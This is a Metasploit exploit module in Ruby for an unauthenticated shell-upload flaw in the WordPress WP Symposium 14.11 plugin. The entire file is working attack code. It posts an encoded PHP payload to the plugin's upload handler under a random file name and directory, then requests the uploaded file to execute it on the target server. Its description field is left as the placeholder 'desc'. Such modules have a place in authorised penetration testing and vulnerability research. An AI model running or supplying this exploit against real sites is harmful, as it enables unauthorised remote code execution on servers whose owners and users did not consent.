##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::HTTP::Wordpress
  def initialize(info = {})
    super(update_info(
      info,
      'Name' => 'Wordpress Wp Symposium 14.11 - Unauthenticated Shell Upload Exploit',
      'Description' => %q{ desc },
      'Author' =>
        [
        'Claudio Viviani', # initial discovery
        'piochu' # metasploit module
        ],
        'License' => MSF_LICENSE,
      'References' =>
          [
          ['URL',  'http://www.exploit-db.com/exploits/35543/'],
          ['WPVDB', '7716']
          ],
      'Privileged' => false,
      'Platform' => ['php'],
      'Arch' => ARCH_PHP,
      'Targets' => [['14.11', {}]],
      'DefaultTarget' => 0,
      'DisclosureDate' => 'Dec 12 2014'))
  end
  
  def exploit
    filename = "#{rand_text_alpha(5)}.php"   
    uploaddir = "./#{rand_text_alpha(5)}/"
  
    data = Rex::MIME::Message.new
    data.add_part(payload.encoded, 'application/octet-stream', nil, "form-data; name=\"files[]\"; filename=\"#{filename}\"")
    data.add_part(uploaddir, nil, nil, 'form-data; name="uploader_dir"')
    data.add_part("1", nil, nil, 'form-data; name="uploader_uid"')
    data.add_part("http://#{peer}#{target_uri}/wp-content/plugins/wp-symposium/server/php/", nil, nil, 'form-data; name="uploader_url"')
    post_data = data.to_s

    print_status("Uploading payload...")
    send_request_cgi({
      'method' => 'POST',
      'uri' => "http://#{peer}#{target_uri}/wp-content/plugins/wp-symposium/server/php/index.php",
      'ctype' => "multipart/form-data; boundary=#{data.bound}",
      'data' => post_data
    }, 5)
    
    print_status("Requesting payload...")
    send_request_cgi({
      'method' => 'GET',
      'uri' => "http://#{peer}#{target_uri}/wp-content/plugins/wp-symposium/server/php/#{uploaddir}/#{filename}",
    }, 5)
    
  end
end
